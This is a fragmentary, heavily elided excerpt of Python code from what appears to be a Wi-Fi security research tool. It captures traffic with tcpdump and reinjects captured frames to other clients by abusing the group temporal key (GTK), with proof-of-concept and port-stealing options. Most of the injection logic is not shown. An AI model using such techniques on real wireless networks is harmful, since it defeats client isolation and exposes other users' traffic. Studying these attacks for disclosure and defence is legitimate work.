...
def start_capture_for_iface(iface, out_path, bpf=None):
    ...
    try:
        ...
        if tcpdump:
            ...
            if bpf:
                cmd += [bpf]
            tcpdump_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
...
class Client2Client:
	...
	def reinject_frame_via_gtk_abuse(self, eth):
	    ...
	    with self.mon_attacker._pn_lock:
	        ccmp_pn = self.mon_attacker.pn
	        self.mon_attacker.pn += 1

	    try:
	        #log(STATUS, f">>> Frame before encryption: {repr(plain_dot11)}", color="green")
	...
	def _pcap_replayer(self, pcap_path, interval=0.02):
	    global tcpdump_process
	    """
	    Follow a (possibly growing) pcap file by repeatedly invoking scapy.sniff(offline=...).
	    For each *new* Ether frame found, call self.reinject_frame_via_gtk_abuse(eth).
	    Uses a SHA1(raw(pkt)) set to skip packets we've already processed.
	    """
	    ...
	    log(STATUS, f"Following live pcap file {pcap_path} for reinjection (sniff-based)...", color="green")

	    seen = set()
	    last_size = 0
	    waited_header = False

	    while not getattr(self, "test_finished", False):
	        try:
	            # callback for sniff: process only unseen Ether packets
	            def _on_pkt(p):
	                try:
	                    if not Ether in p:
	                        return
	                    ...
	                    try:
	                        self.reinject_frame_via_gtk_abuse(eth)
	                        log(STATUS, "Reinjected one frame (sniff-based)!", color="green")
	                    except Exception as e:
	                        log(WARNING, f"Error reinjecting frame: {e}")
	                except Exception as e:
	                    log(WARNING, f"Packet processing callback error: {e}")
	            for pkt_data, meta in RawPcapReader(pcap_path):
	                pkt = Ether(pkt_data)
	                _on_pkt(pkt)
	            # sniff with a short timeout so we return and can loop (allows file growth)
	            #sniff(offline=pcap_path, prn=_on_pkt, store=0, timeout=1)
	            #sniffer = AsyncSniffer(filter="udp port 5201", iface=self.sup_attacker.nic_iface, prn=_on_pkt, store=0)
	            #sniffer.start()
	            # small sleep between iterations to limit CPU
	            #time.sleep(interval)
	            #sniffer.stop()
	        except EOFError:
	            # benign: file write in progress
	            time.sleep(interval)
	            continue
	        except Exception as e:
	            # Handle common scapy/raw pcap errors gracefully (same style as original)
	            msg = str(e).lower()
	            if "no data could be read" in msg or "not a supported capture file" in msg or "truncated" in msg:
	                # likely partial header / writer in progress
	                time.sleep(interval)
	                continue
	            log(WARNING, f"Pcap follow error (sniff-based): {e}")
	            time.sleep(0.5)
	...
	def run(self):
		...
		if (self.options.reinject_gtk is not None) and not (self.options.poc and self.options.c2c_port_steal):
			...
			pcap_path = getattr(self.options, "c2c_pcap_output", None)
			if pcap_path and os.path.exists(pcap_path):
			    # start a dedicated thread to replay pcap and reinject frames
			    t_replay = threading.Thread(target=self._pcap_replayer, args=(pcap_path, 0.001), daemon=True)
			    t_replay.start()
			    log(STATUS, f"Started pcap replayer thread for {pcap_path}", color="green")
